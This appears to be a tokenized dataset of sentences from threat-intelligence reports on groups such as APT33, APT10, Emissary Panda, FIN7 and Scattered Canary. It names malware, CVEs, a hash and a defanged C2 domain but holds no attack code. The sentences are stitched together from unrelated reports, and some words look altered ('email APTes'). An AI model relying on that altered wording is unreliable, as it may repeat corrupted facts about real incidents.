XAgentOSX
.
 
While
OceanLotus
targets
are
global
,
their
operations
are
mostly
active
within
the
APAC
region
which
encompasses
targeting
private
sectors
across
multiple
industries
,
foreign
governments
,
activists
,
and
dissidents
connected
to
Vietnam
.
 
NewsBeef
attacks
against
Saudi
Arabian
organizations
and
individuals
are
likely
to
continue
.
 
Rapid7
discovered
that
additional
data
was
placed
into
the
Dropbox
accounts
under
control
of
the
APT10
during
the
compromise
and
was
able
to
attribute
data
that
was
placed
into
it
as
being
owned
by
Visma
.
 
Rapid7
again
observed
APT10
dropping
payloads
named
ccSEUPDT.exe
.
 
These
RAT
families
are
discussed
in
Novettas
other
report
on
the
Lazarus
Groups
RAT
and
Staging
capabilities
.
 
Magic
Hound
has
primarily
targeted
organizations
in
the
energy
,
government
,
and
technology
sectors
that
are
either
based
or
have
business
interests
in
Saudi
Arabia
.
 
Since
at
least
2013
,
the
Iranian
threat
group
that
FireEye
tracks
as
APT33
has
carried
out
a
Cyber
Espionage
operation
to
collect
information
from
defense
,
aerospace
and
petrochemical
organizations
.
 
CTU
researchers
observed
likely
unsuccessful
phishing
campaigns
being
followed
by
highly
targeted
spearphishing
and
social
engineering
attacks
from
a
threat
actor
using
the
name
Mia
Ash
.
 
CTU
researchers
conclude
that
COBALT
GYPSY
created
the
persona
to
gain
unauthorized
access
to
targeted
computer
networks
via
social
engineering
.
 
Characterized
by
relatively
unsophisticated
technical
merit
and
extensive
use
of
spear
phishing
,
the
Magic
Hound
targeted
individuals
and
organizations
in
the
Middle
East
,
as
well
as
across
Europe
and
in
the
United
States
.
 
These
malware
families
have
a
rich
history
of
being
used
in
many
targeted
attacks
against
government
and
private
organizations
.
 
The
activity
surfaced
in
Southeast
Asia
,
a
region
where
APT10
frequently
operates
.
 
The
samples
we
analyzed
originated
from
the
Philippines
.
 
APT10
frequently
targets
the
Southeast
Asia
region
.
 
Both
of
the
loaders
variants
and
their
various
payloads
that
enSilo
analyzed
share
similar
Tactics
,
Techniques
,
and
Procedures
and
code
associated
with
APT10
.
 
Typically
,
APT10
tends
to
employ
a
namesquatting
scheme
in
their
domains
that
aims
to
confuse
the
observer
by
posing
as
a
legitimate
domain
.
 
Also
,
the
certificate
embedded
in
the
Quasar
sample
was
issued
at
22.12.2018
,
which
correlates
with
the
files
compilation
date
.
 
Over
the
past
three
months
,
Recorded
Futures
Insikt
Group
has
observed
an
increase
in
APT33s
also
known
as
Elfin
infrastructure
building
and
targeting
activity
,
and
on
June
21
,
2019
,
Yahoo
.
 
News
reported
that
the
U.S.
Cyber
Command
launched
cyberattacks
on
an
Iranian
spy
group
.
 
Iranian
state-sponsored
threat
actor
APT33
has
been
conducting
cyberespionage
activity
since
at
least
2013
,
predominantly
targeting
nations
in
the
Middle
East
,
but
also
notably
targeting
U.S.
,
South
Korean
,
and
European
commercial
entities
across
a
wide
variety
of
sectors
.
 
Our
research
found
that
APT33
,
or
a
closely
aligned
threat
actor
,
continues
to
conduct
and
prepare
for
widespread
cyberespionage
activity
,
with
over
1
,
200
domains
used
since
March
28
,
2019
and
with
a
strong
emphasis
on
using
commodity
malware
.
 
The
targeting
of
mainly
Saudi
Arabian
organizations
across
a
wide
variety
of
industries
aligns
with
historical
targeting
patterns
for
the
group
,
which
appear
undeterred
following
previous
exposs
of
their
activity
.
 
Towards
the
end
of
April
2019
,
we
tracked
down
what
we
believe
to
be
new
activity
by
APT10
,
a
Chinese
Cyber
Espionage
group
.
 
Almost
60%
of
the
suspected
APT33
domains
that
were
classified
to
malware
families
related
to
njRAT
infections
,
a
RAT
not
previously
associated
with
APT33
activity
.
 
Other
commodity
RAT
malware
families
,
such
as
AdwindRAT
and
RevengeRAT
,
were
also
linked
to
suspected
APT33
domain
activity
.
 
APT33
is
an
Iranian
state-sponsored
threat
actor
that
has
engaged
in
cyberespionage
activities
since
at
least
2013
.
 
Western
and
Saudi
organizations
in
industries
that
have
been
historically
targeted
by
APT33
should
be
monitoring
geopolitical
developments
and
increasing
the
scrutiny
of
operational
security
controls
focusing
on
detection
and
remediation
of
initial
unauthorized
access
,
specifically
from
phishing
campaigns
,
webshells
.
 
Symantecs
Elfin
report
denoted
additional
targeting
of
the
engineering
,
chemical
,
research
,
finance
,
IT
,
and
healthcare
sectors
.
 
We
assess
that
the
recent
reporting
on
links
between
the
Nasr
Institute
and
Kavosh
Security
Group
,
as
well
as
technical
and
persona
analysis
,
overlaps
among
APT33
,
APT35
,
and
MUDDYWATER
,
and
is
probably
a
result
of
the
tiered
structure
that
Iran
utilizes
to
manage
cyber
operations
.
 
Recorded
Future
has
been
monitoring
APT33
activity
,
beginning
with
research
published
in
October
2017
,
which
revealed
new
infrastructure
,
malware
hashes
,
and
TTPs
relating
to
the
threat
actor(s)
.
 
FireEye
also
noted
in
their
2017
report
that
the
online
handle
xman_1365_x
,
found
within
the
PDB
path
in
an
APT33
TURNEDUP
backdoor
sample
,
belonged
to
an
individual
at
the
Nasr
Institute
.
 
Recorded
Futures
Insikt
Group
has
been
monitoring
APT33
activity
,
beginning
with
research
published
in
October
2017
,
which
revealed
new
infrastructure
,
malware
hashes
,
and
TTPs
relating
to
the
threat
actor(s)
.
 
Based
on
this
information
,
it
is
possible
that
upon
the
exposure
of
the
Nasr
Institute
as
a
front
for
Iranian
state-sponsored
offensive
cyber
activity
,
employees
transitioned
over
to
other
entities
,
such
as
Kavosh
,
to
protect
their
identities
and
minimize
further
exposure
.
 
Insikt
Group
researchers
used
proprietary
methods
,
including
Recorded
Future
Domain
Analysis
and
Recorded
Future
Network
Traffic
Analysis
,
along
with
other
common
analytical
approaches
,
to
profile
recently
reported
Iranian
threat
actor
APT33s
domain
and
hosting
infrastructure
in
an
effort
to
identify
recent
activity
.
 
Insikt
Group
enumerated
all
domains
reported
as
being
used
by
APT33
since
January
2019
.
 
PlugX
is
a
modular
structured
malware
that
has
many
different
operational
plugins
such
as
communication
compression
and
encryption
,
network
enumeration
,
files
interaction
,
remote
shell
operations
and
more
.
 
Using
data
from
Recorded
Future
Domain
Analysis
and
combining
it
with
data
derived
from
Recorded
Future
Network
Traffic
Analysis
,
Insikt
Group
researchers
were
able
to
identify
a
small
selection
of
likely
targeted
organizations
impacted
by
suspected
APT33
activity
.
 
Following
the
exposure
of
a
wide
range
of
their
infrastructure
and
operations
by
Symantec
earlier
this
year
,
we
discovered
that
APT33
,
or
closely
aligned
actors
,
reacted
by
either
parking
or
reassigning
some
of
their
domain
infrastructure
.
 
Since
late
March
,
suspected
APT33
threat
actors
have
continued
to
use
a
large
swath
of
operational
infrastructure
,
well
in
excess
of
1
,
200
domains
,
with
many
observed
communicating
with
19
different
commodity
RAT
implants
.
 
While
we
havent
observed
a
widespread
targeting
of
commercial
entities
or
regional
adversaries
like
in
previously
documented
APT33
operations
,
the
handful
of
targeted
organizations
that
we
did
observe
were
mainly
located
in
Saudi
Arabia
across
a
range
of
industries
,
indicating
ongoing
targeting
aligned
with
geopolitical
aims
.
 
The
zip
contained
a
sample
of
the
Poison
Ivy
malware
which
is
also
known
to
be
used
by
APT10
.
 
The
new
malware
families
,
which
we
will
examine
later
in
this
post
,
show
APT34
relying
on
their
PowerShell
development
capabilities
,
as
well
as
trying
their
hand
at
Golang
.
 
Additionally
,
with
the
assistance
of
our
FireEye
Labs
Advanced
Reverse
Engineering
(FLARE)
,
Intelligence
,
and
Advanced
Practices
teams
,
we
identified
three
new
malware
families
and
a
reappearance
of
PICKPOCKET
,
malware
exclusively
observed
in
use
by
APT34
.
 
This
threat
group
has
conducted
broad
targeting
across
a
variety
of
industries
operating
in
the
Middle
East;
however
,
we
believe
APT34's
strongest
interest
is
gaining
access
to
financial
,
energy
,
and
government
entities
.
 
Additionally
,
with
the
assistance
of
FireEye
Labs
,
we
identified
three
new
malware
families
and
a
reappearance
of
PICKPOCKET
,
malware
exclusively
observed
in
use
by
APT34
.
 
APT34
is
an
Iran-nexus
cluster
of
cyber
espionage
activity
that
has
been
active
since
at
least
2014
.
 
This
CPE
was
created
to
ensure
our
customers
are
updated
with
new
discoveries
,
activity
and
detection
efforts
related
to
this
campaign
,
along
with
other
recent
activity
from
Iranian-nexus
threat
actors
to
include
APT33
,
which
is
mentioned
in
this
updated
FireEye
blog
post
.
 
On
June
19
,
2019
,
FireEyes
Managed
Defense
Security
Operations
Center
received
an
exploit
detection
alert
on
one
of
our
FireEye
Endpoint
Security
appliances
.
 
A
backdoor
that
communicates
with
a
single
command
and
control
server
using
HTTP
GET
and
POST
requests
,
TONEDEAF
supports
collecting
system
information
,
uploading
and
downloading
of
files
,
and
arbitrary
shell
command
execution
.
 
FireEyes
Advanced
Practices
and
Intelligence
teams
were
able
to
identify
additional
artifacts
and
activity
from
the
APT34
actors
at
other
victim
organizations
.
 
Of
note
,
FireEye
discovered
two
additional
new
malware
families
hosted
at
this
domain
,
VALUEVAULT
and
LONGWATCH
.
 
This
tool
was
previously
observed
during
a
Mandiant
incident
response
in
2018
and
,
to
date
,
solely
utilized
by
APT34
.
 
PICKPOCKET
is
a
credential
theft
tool
that
dumps
the
user's
website
login
credentials
from
Chrome
,
Firefox
,
and
Internet
Explorer
to
a
file
.
 
FireEye
detects
this
activity
across
our
platforms
,
including
named
detection
for
TONEDEAF
,
VALUEVAULT
,
and
LONGWATCH
.
 
Several
spear-phishing
campaigns
attributed
to
Carbanak
,
all
occurring
between
March
and
May
2018
,
were
analyzed
by
security
researchers
in
2018
.
 
One
of
the
most
prolific
APT-style
cyberattacks
,
specifically
targeting
the
financial
sector
,
is
known
as
Carbanak
.
 
Discovered
in
2014
,
the
campaign
quickly
gained
notoriety
after
compromising
the
security
systems
of
100
banks
in
40
countries
and
stealing
up
to
$1
billion
in
the
process
.
 
The
same
group
is
believed
to
have
also
been
using
the
Cobalt
Strike
framework
to
run
sophisticated
campaigns
,
plotting
and
performing
financial
heists
of
financial
institutions
.
 
Banks
in
countries
such
as
Russia
,
the
United
Kingdom
,
the
Netherlands
,
Spain
,
Romania
,
Belarus
,
Poland
,
Estonia
,
Bulgaria
,
Georgia
,
Moldova
,
Kyrgyzstan
,
Armenia
,
Taiwan
and
Malaysia
have
allegedly
been
targeted
with
spearphishing
emails
,
luring
victims
into
clicking
malicious
URLs
and
executing
booby-trapped
documents
.
 
A
Carbanak
trademark
in
cyberattacks
remains
the
use
of
Cobalt
Strike
a
powerful
pentesting
tool
designed
for
exploiting
and
executing
malicious
code
,
simulating
post-exploitation
actions
of
advanced
threat
actors
which
allows
them
to
infiltrate
the
organization
,
move
laterally
,
exfiltrate
data
,
and
deploy
anti-forensic
and
evasion
tools
.
 
However
,
this
action
doesnt
appear
to
have
made
a
dent
in
the
cybercriminal
organization
,
as
subsequent
spear-phishing
campaigns
seem
to
have
been
reported
from
March
until
May
2018
.
 
Bitdefenders
forensics
and
investigation
team
was
contacted
to
look
into
a
security
incident
that
started
in
May
2018
with
an
email
received
by
two
of
the
banks
employees
.
 
The
Carbanak
group
,
which
has
a
long
track
record
of
compromising
infrastructure
belonging
to
financial
institutions
,
is
still
active
.
 
Its
purpose
remains
to
manipulate
financial
assets
,
such
as
transferring
funds
from
bank
accounts
or
taking
over
ATM
infrastructures
and
instructing
them
to
dispense
cash
at
predetermined
time
intervals
.
 
If
the
attack
had
succeeded
,
it
would
have
given
hackers
control
over
the
ATM
network
,
while
money
mules
would
have
been
standing
by
the
ATM
machines
at
pre-set
time
intervals
to
cash
them
out
.
 
The
actors
uploaded
a
variety
of
tools
that
they
used
to
perform
additional
activities
on
the
compromised
network
,
such
as
dumping
credentials
,
as
well
as
locating
and
pivoting
to
additional
systems
on
the
network
.
 
We
believe
Emissary
Panda
exploited
a
recently
patched
vulnerability
in
Microsoft
SharePoint
tracked
by
CVE-2019-0604
,
which
is
a
remote
code
execution
vulnerability
used
to
compromise
the
server
and
eventually
install
a
webshell
.
 
Bitdefenders
investigation
shows
the
attackers
main
methods
remain
to
quietly
infiltrate
the
infrastructure
by
establishing
a
foothold
on
an
employees
system
,
then
move
laterally
across
the
infrastructure
or
elevate
privileges
to
find
critical
systems
that
manage
financial
transactions
or
ATM
networks
.
 
We
also
found
the
China
Chopper
webshell
on
the
SharePoint
servers
,
which
has
also
been
used
by
the
Emissary
Panda
threat
group
.
 
Of
particular
note
is
their
use
of
tools
to
identify
systems
vulnerable
to
CVE-2017-0144
,
which
is
the
same
vulnerability
exploited
by
EternalBlue
that
is
best
known
for
its
use
in
the
WannaCry
attacks
of
2017
.
 
In
addition
to
the
aforementioned
post-exploitation
tools
,
the
actors
used
these
webshells
to
upload
legitimate
executables
that
they
would
use
DLL
sideloading
to
run
a
malicious
DLL
that
has
code
overlaps
with
known
Emissary
Panda
attacks
.
 
This
webshell
activity
took
place
across
three
SharePoint
servers
hosted
by
two
different
government
organizations
between
April
1
,
2019
and
April
16
,
2019
,
where
actors
uploaded
a
total
of
24
unique
executables
across
the
three
SharePoint
servers
.
 
The
timeline
shows
three
main
clusters
of
activity
across
the
three
webshells
,
with
activity
occurring
on
two
separate
webshells
within
a
very
small
window
of
time
on
April
2
,
2019
and
the
activity
involving
the
third
webshell
two
weeks
later
on
April
16
,
2019
.
 
In
April
2019
,
several
national
security
organizations
released
alerts
on
CVE-2019-0604
exploitation
,
including
the
Saudi
Arabian
National
Cyber
Security
Center
and
the
Canadian
Center
for
Cyber
Security
.
 
Based
on
the
functionality
of
the
various
tools
uploaded
to
the
webshells
,
we
believe
the
threat
actors
breach
the
SharePoint
servers
to
use
as
a
beachhead
,
then
attempt
to
move
laterally
across
the
network
via
stolen
credentials
and
exploiting
vulnerabilities
.
 
We
also
observed
the
actors
uploading
custom
backdoors
such
as
HyperBro
which
is
commonly
associated
with
Emissary
Panda
.
 
Both
of
these
alerts
discussed
campaigns
in
which
actors
used
the
CVE-2019-0604
to
exploit
SharePoint
servers
to
install
the
China
Chopper
webshell
.
 
During
our
research
into
this
attack
campaign
,
Unit
42
gathered
several
tools
that
the
Emissary
Panda
uploaded
to
the
three
webshells
at
the
two
government
organizations
.
 
We
also
observed
the
actors
uploading
the
HyperBro
backdoor
to
one
of
the
webshells
,
as
well
as
legitimate
executables
that
would
sideload
malicious
DLLs
that
have
overlapping
code
associated
with
known
Emissary
Panda
activity
.
 
Lastly
,
we
saw
the
actor
uploading
a
custom
backdoor
called
HyperBro
,
which
has
been
associated
with
Emissary
Panda
operations
in
the
past
.
 
The
other
overlapping
files
are
tools
used
by
the
adversary
to
locate
other
systems
on
the
network
(
etool.exe
)
,
check
to
see
if
they
are
vulnerable
to
CVE-2017-0144
(
EternalBlue
)
patched
in
MS07-010
(checker1.exe)
and
pivot
to
them
using
remote
execution
functionality
offered
by
a
tool
similar
to
PsExec
offered
by
Impacket
(
psexec.exe
)
.
 
Also
,
the
NCSC
advisory
mentioned
that
the
actors
used
a
file
name
stylecss.aspx
for
their
webshell
,
which
is
the
same
filename
we
saw
associated
with
China
Chopper
.
 
we
will
provide
an
analysis
of
the
HyperBro
tool
in
an
upcoming
section
.
 
However
,
using
NCC
Groups
research
published
in
May
2018
,
we
were
able
to
discover
code
overlaps
between
these
DLLs
and
a
sideloaded
DLL
that
ran
the
SysUpdate
tool
that
the
NCC
group
has
associated
with
an
Emissary
Panda
campaign
.
 
The
list
also
includes
several
hack
tools
,
such
as
Mimikatz
for
credential
dumping
and
several
compiled
python
scripts
used
to
locate
and
compromise
other
systems
on
the
local
network
.
 
Unfortunately
,
we
do
not
have
access
to
the
PYTHON33.hlp
or
CreateTsMediaAdm.hlp
files
,
so
we
do
not
know
the
final
payload
loaded
by
either
of
these
DLLs
.
 
Figure
9
shows
a
code
comparison
between
the
PYTHON33.dll
(right)
and
inicore_v2.3.30.dll
(left)
(SHA256:
4d65d371a789aabe1beadcc10b38da1f998cd3ec87d4cc1cfbf0af014b783822
)
,
which
was
sideloaded
to
run
the
SysUpdate
tool
in
a
previous
Emissary
Panda
campaign
.
 
The
Emissary
Panda
threat
group
loaded
the
China
Chopper
webshell
onto
SharePoint
servers
at
two
Government
organizations
in
the
Middle
East
,
which
we
believe
with
high
confidence
involved
exploiting
a
remote
code
execution
vulnerability
in
SharePoint
tracked
in
CVE-2019-0604
.
 
The
files
uploaded
to
this
webshell
included
the
same
compiled
python
script
that
would
scan
remote
systems
that
were
vulnerable
to
CVE-2017-0144
(
EternalBlue
)
that
we
saw
uploaded
to
the
other
errr.aspx
webshell
.
 
According
to
Microsofts
advisory
,
this
vulnerability
was
patched
on
March
12
,
2019
and
we
first
saw
the
webshell
activity
on
April
1
,
2019
.
 
We
believe
the
actors
pivoted
to
other
systems
on
the
network
using
stolen
credentials
and
by
exploiting
the
CVE-2017-0144
(
EternalBlue
)
vulnerability
patched
in
MS17-010
.
 
Once
the
adversary
established
a
foothold
on
the
targeted
network
,
they
used
China
Chopper
and
other
webshells
to
upload
additional
tools
to
the
SharePoint
server
to
dump
credentials
,
perform
network
reconnaissance
and
pivot
to
other
systems
.
 
We
also
observed
Emissary
Panda
uploading
legitimate
tools
that
would
sideload
DLLs
,
specifically
the
Sublime
Text
plugin
host
and
the
Microsofts
Create
Media
application
,
both
of
which
we
had
never
seen
used
for
DLL
sideloading
before
.
 
Consequently
,
the
Linux
malware
ecosystem
is
plagued
by
financial
driven
crypto-miners
and
DDoS
botnet
tools
which
mostly
target
vulnerable
servers
.
 
We
also
observed
the
actors
uploading
legitimate
tools
that
would
sideload
DLLs
,
specifically
the
Sublime
Text
plugin
host
and
the
Microsofts
Create
Media
application
,
both
of
which
we
had
never
seen
used
for
DLL
sideloading
before
.
 
It
has
been
active
since
at
least
2013
,
and
has
targeted
individuals
likely
involved
with
the
Ukrainian
government
.
 
The
groups
implants
are
characterized
by
the
employment
of
information
stealing
tools
among
them
being
screenshot
and
document
stealers
delivered
via
a
SFX
,
and
made
to
achieve
persistence
through
a
scheduled
task
.
 
The
finding
shows
that
EvilGnome
operates
on
an
IP
address
that
was
controlled
by
the
Gamaredon
group
two
months
ago
.
 
FIN7
operations
are
linked
to
numerous
intrusion
attempts
having
targeted
hundreds
of
companies
since
at
least
as
early
as
2015
.
 
The
FIN7
intrusion
set
continued
its
tailored
spear
phishing
campaigns
throughout
last
year
.
 
In
addition
,
during
the
investigation
,
we
discovered
certain
similarities
to
other
attacker
groups
that
seemed
to
share
or
copy
the
FIN7
TTPs
in
their
own
operations
.
 
In
2018-2019
,
researchers
of
Kaspersky
Labs
Global
Research
and
Analysis
Team
analyzed
various
campaigns
that
used
the
same
Tactics
Tools
and
Procedures
(TTPs)
as
the
historic
FIN7
,
leading
the
researchers
to
believe
that
this
threat
actor
had
remained
active
despite
the
2018
arrests
.
 
One
of
the
domains
used
by
FIN7
in
their
2018
campaign
of
spear
phishing
contained
more
than
130
email
APTes
,
leading
us
to
think
that
more
than
130
companies
had
been
targeted
by
the
end
of
2018
.
 
Interestingly
,
following
some
open-source
publications
about
them
,
the
FIN7
operators
seems
to
have
developed
a
homemade
builder
of
malicious
Office
document
using
ideas
from
ThreadKit
,
which
they
employed
during
the
summer
of
2018
.
 
The
first
module
downloaded
by
the
GRIFFON
malware
to
the
victims
computer
is
an
information-gathering
JScript
,
which
allows
the
cybercriminals
to
understand
the
context
of
the
infected
workstation
.
 
The
new
GRIFFON
implant
is
written
to
the
hard
drive
before
each
execution
,
limiting
the
file-less
aspect
of
this
method
.
 
Given
FIN7s
previous
use
of
false
security
companies
,
we
decided
to
look
deeper
into
this
one
.
 
This
activity
cluster
,
which
Kaspersky
Lab
has
followed
for
a
few
years
,
uses
various
implants
for
targeting
mainly
banks
,
and
developers
of
banking
and
money
processing
software
solutions
.
 
FIN7s
last
campaigns
were
targeting
banks
in
Europe
and
Central
America
.
 
After
a
successful
penetration
,
FIN7
uses
its
own
backdoors
and
the
CobaltStrike
framework
or
Powershell
Empire
components
to
hop
to
interesting
parts
of
the
network
,
where
it
can
monetize
its
access
.
 
AveMaria
is
a
new
botnet
,
whose
first
version
we
found
in
September
2018
,
right
after
the
arrests
of
the
FIN7
members
.
 
This
threat
actor
stole
suspected
of
stealing
13
million
from
Bank
of
Valetta
,
Malta
earlier
this
year
.
 
In
fact
,
AveMaria
is
a
classic
infostealer
bot
that
collects
all
possible
credentials
from
various
types
of
software:
browsers
,
email
clients
,
messengers
,
etc.
,
and
can
act
as
a
keylogger
.
 
They
also
use
AutoIT
droppers
,
password-protected
EXE
files
and
even
ISO
images
.
 
To
deliver
their
malware
,
the
cyber
criminals
use
spearphishing
emails
with
various
types
of
attachments:
MS
Office
documents
or
spreadsheet
files
exploiting
some
known
vulnerability
like
CVE-2017-11882
,
or
documents
with
Ole2Link
and
SCT
.
 
Interestingly
,
this
actor
targeted
financial
entities
and
companies
in
one
African
country
,
which
lead
us
to
think
that
CopyPaste
was
associated
with
cybermercenaries
or
a
training
center
.
 
At
the
end
of
2018
,
while
searching
for
new
FIN7
campaigns
via
telemetry
,
we
discovered
a
set
of
activity
that
we
temporarily
called
CopyPaste
from
a
previously
unknown
APT
.
 
FIN7
and
Cobalt
used
decoy
302
HTTP
redirections
too
,
FIN7
on
its
GRIFFON
C2s
before
January
2018
,
and
Cobalt
,
on
its
staging
servers
,
similar
to
CopyPaste
.
 
Quite
recently
,
FIN7
threat
actors
typosquatted
the
brand
Digicert
using
the
domain
name
digicert-cdn[.]com
,
which
is
used
as
a
command
and
control
server
for
their
GRIFFON
implants
.
 
The
first
of
them
is
the
well-known
FIN7
,
which
specializes
in
attacking
various
companies
to
get
access
to
financial
data
or
PoS
infrastructure
.
 
The
second
one
is
CobaltGoblin
Carbanak
EmpireMonkey
,
which
uses
the
same
toolkit
,
techniques
and
similar
infrastructure
but
targets
only
financial
institutions
and
associated
software/services
providers
.
 
we
observe
,
with
various
level
of
confidence
,
that
there
are
several
interconnected
groups
using
very
similar
toolkits
and
the
same
infrastructure
to
conduct
their
cyberattacks
.
 
The
last
piece
is
the
newly
discovered
CopyPaste
group
,
who
targeted
financial
entities
and
companies
in
one
African
country
,
which
lead
us
to
think
that
CopyPaste
was
associated
with
cybermercenaries
or
a
training
center
.
 
At
the
end
of
2018
,
the
cluster
started
to
use
not
only
CobaltStrike
but
also
Powershell
Empire
in
order
to
gain
a
foothold
on
the
victims
networks
.
 
FIN7
thus
continues
to
use
effective
spearphishing
campaigns
in
conjunction
with
well-known
MS
Office
exploits
generated
by
the
framework
.
 
MuddyWater
is
widely
regarded
as
a
long-lived
APT
group
in
the
Middle
East
.
 
From
February
to
April
2019
,
MuddyWater
launched
a
series
of
spear-phishing
attacks
against
governments
,
educational
institutions
,
financial
,
telecommunications
and
defense
companies
in
Turkey
,
Iran
,
Afghanistan
,
Iraq
,
Tajikistan
and
Azerbaijan
.
 
FIN7
thus
continue
to
use
effective
spearphishing
campaigns
in
conjunction
with
well-known
MS
Office
exploits
generated
by
the
framework
.
 
We
also
unearthed
and
detailed
our
other
findings
on
MuddyWater
,
such
as
its
connection
to
four
Android
malware
variants
and
its
use
of
false
flag
techniques
,
among
others
,
in
our
report
New
MuddyWater
Activities
Uncovered:
Threat
Actors
Used
Multi-Stage
Backdoors
,
False
Flags
,
Android
malware
,
and
More
.
 
Instead
,
the
campaign
used
compromised
legitimate
accounts
to
trick
victims
into
installing
malware
.
 
Notably
,
the
groups
use
of
email
as
infection
vector
seems
to
yield
success
for
their
campaigns
.
 
We
also
observed
MuddyWaters
use
of
multiple
open
source
post-exploitation
tools
,
which
they
deployed
after
successfully
compromising
a
target
.
 
The
attacker
also
connected
to
the
compromised
servers
from
IP
addresses
that
were
linked
to
dynamic
domain
names
used
as
C&Cs
by
the
delivered
payloads
.
 
The
main
payload
is
usually
Imminent
Monitor
RAT
;
however
,
at
the
beginning
of
2018
,
we
also
observed
the
use
of
LuminosityLink
RAT
,
NetWire
RAT
,
and
NjRAT
.
 
In
a
case
in
June
2019
,
we
also
noticed
Warzone
RAT
being
used
.
 
Xpert
RAT
reportedly
first
appeared
in
2011
.
 
The
first
version
of
Proyecto
RAT
was
published
at
the
end
of
2010
.
 
But
with
the
West
African
gang
weve
named
Scattered
Canary
,
we
have
a
deeper
look
at
how
business
email
compromise
is
connected
to
the
rest
of
the
cybercrime
.
 
This
investigation
by
the
Agari
Cyber
Intelligence
Division
into
the
cybercriminal
group
weve
named
Scattered
Canary
offers
unprecedented
visibility
into
eleven
years
of
fraud
and
criminal
activities
,
and
the
growth
of
a
419
startup
into
a
fully
operational
BEC
business
.
 
While
this
criminal
organizations
activities
now
center
around
BEC
,
and
extend
to
romance
scams
,
credit
card
fraud
,
check
fraud
,
fake
job
listings
,
credential
harvesting
,
tax
schemes
,
and
more
,
these
actors
came
from
much
humbler
beginnings
,
starting
with
basic
Craigslist
scams
in
2008
.
 
On
November
29
,
2018
,
Scattered
Canary
sent
an
attack
email
to
Agari
CFO
Raymond
Lim
,
enquiring
as
to
his
availability
to
send
out
a
domestic
wire
transfer
.
 
Many
feel
that
they
have
a
home
team
advantage
living
in
Nigeria
,
where
they
are
free
to
pay
off
law
enforcement
to
look
the
other
ACT
.
 
Scattered
Canarys
fraudulent
history
can
be
traced
as
far
back
as
October
2008
,
when
the
group
first
arrived
on
the
cybercriminal
circuit
.
 
By
March
2016
,
one
of
Scattered
Canarys
members
had
built
enough
trust
with
a
romance
victimwho
well
call
Janethat
she
became
a
frequent
source
of
new
mule
accounts
for
the
group
.
 
Alphas
early
role
was
fairly
simple:
engage
with
individuals
,
who
he
chose
based
on
the
goods
they
were
selling
,
and
then
provide
personal
shipping
addresses
back
to
Omega
.
 
By
all
accounts
,
late
2015
was
the
beginning
of
BEC
for
Scattered
Canary
.
 
The
first
type
of
attack
Scattered
Canary
pivoted
to
was
credential
phishing
.
 
Between
July
2015
and
February
2016
,
Scattered
Canarys
primary
focus
seemed
to
be
mass
harvesting
general
credentials
using
a
Google
Docs
phishing
page
.
 
In
the
first
few
months
of
their
credential
phishing
ventures
,
Scattered
Canarys
sights
were
mostly
set
on
Asian
targetsMalaysia
and
Japan
,
in
particular
.
 
In
November
2015
,
the
group
started
to
focus
on
North
American
users
,
mostly
in
the
United
States
.
 
This
activity
ceased
in
February
2016
,
likely
because
the
men
who
made
up
Scattered
Canary
began
to
focus
on
honing
their
BEC
skills
.
 
In
total
,
Scattered
Canary
received
more
than
3
,
000
account
credentials
as
a
result
of
their
phishing
attacks
.
 
For
over
eighteen
months
from
March
2017
until
November
2018
,
Scattered
Canarys
frequent
enterprise-focused
credential
phishing
campaigns
almost
exclusively
targeted
businesses
in
the
United
States
and
Canada
.
 
In
July
2018
,
following
a
trend
we
have
observed
across
the
entire
BEC
threat
landscape
,
Scattered
Canary
changed
their
preferred
cash
out
mechanism
from
wire
transfers
to
gift
cards
.
 
Instead
of
using
fake
Google
Docs
phishing
pages
to
collect
personal
email
login
credentials
,
Scattered
Canary
began
using
phishing
pages
of
commonly
used
business
applications
to
compromise
enterprise
credentials
.
 
Using
personal
information
obtained
from
various
sources
,
Scattered
Canary
started
perpetrating
fraud
against
US
federal
and
state
government
agencies
.
 
In
total
,
35
actors
have
been
tied
to
Scattered
Canarys
operations
since
the
group
emerged
in
2008
.
 
Just
as
with
romance
scams
,
actors
make
use
of
scripts
and
templates
they
can
copy-and-paste
without
having
to
create
something
on
their
own
.
 
When
it
comes
to
engaging
targets
,
Scattered
Canary
frequently
maximized
efficiencies
through
the
use
of
scripts
,
or
as
some
members
of
the
group
call
them
,
formats.
These
formats
are
templated
text
documents
that
can
contain
several
layers
of
phishing
messages
to
send
to
potential
victims
.
 
Recently
,
we
unveiled
the
existence
of
a
UEFI
rootkit
,
called
LoJax
,
which
we
attribute
to
the
Sednit
group
.
 
If
Scattered
Canary
can
be
seen
as
a
microcosm
for
the
rapidly
evolving
organizations
behind
todays
most
pernicious
email
scams
,
this
report
demonstrates
that
a
much
more
holistic
approachone
based
on
threat
actor
identity
rather
than
type
of
fraudulent
activityis
required
to
detect
email
fraud
and
protect
organizations
.
 
This
is
a
first
for
an
APT
group
,
and
shows
Sednit
has
access
to
very
sophisticated
tools
to
conduct
its
espionage
operations
.
 
Three
years
ago
,
the
Sednit
group
unleashed
new
components
targeting
victims
in
various
countries
in
the
Middle
East
and
Central
Asia
.
 
In
the
past
,
Sednit
used
a
similar
technique
for
credential
phishing
.
 
At
the
end
of
August
2018
,
the
Sednit
group
launched
a
spearphishing
email
campaign
where
it
distributed
shortened
URLs
that
delivered
the
first
stage
of
Zebrocy
components
.
 
As
we
explained
in
our
most
recent
blogpost
about
Zebrocy
,
the
configuration
of
the
backdoor
is
stored
in
in
the
resource
section
and
is
split
into
four
different
hex-encoded
,
encrypted
blobs
.
 
The
past
iteration
of
SLUB
spread
from
a
unique
watering
hole
website
exploiting
CVE-2018-8174
,
a
VBScript
engine
vulnerability
.
 
It
used
GitHub
and
Slack
as
tools
for
communication
between
the
malware
and
its
controller
.
 
On
July
9
,
we
discovered
a
new
version
of
SLUB
delivered
via
another
unique
watering
hole
website
.
 
This
malicious
site
used
CVE-2019-0752
,
an
Internet
Explorer
vulnerability
discovered
by
Trend
Micros
Zero
Day
Initiative
(
ZDI
)
that
was
just
patched
this
April
.
 
Since
we
published
out
last
report
on
SLUB
,
the
backdoor
has
been
updated
and
several
improvements
were
implemented
.
 
The
SLUB
malware
was
delivered
through
watering
hole
websites
that
were
injected
with
exploits
for
CVE-2018-8174
or
CVE-2019-0752
.
 
During
this
attack
,
we
found
that
the
SLUB
malware
used
two
Slack
teams
sales-yww9809
and
marketing-pwx7789
.
 
SWEED
remains
consistent
across
most
of
their
campaigns
in
their
use
of
spear-phishing
emails
with
malicious
attachments
.
 
In
April
2018
,
SWEED
began
making
use
of
a
previously
disclosed
Office
exploit
.
 
In
May
2018
,
campaigns
being
conducted
by
SWEED
began
leveraging
another
vulnerability
in
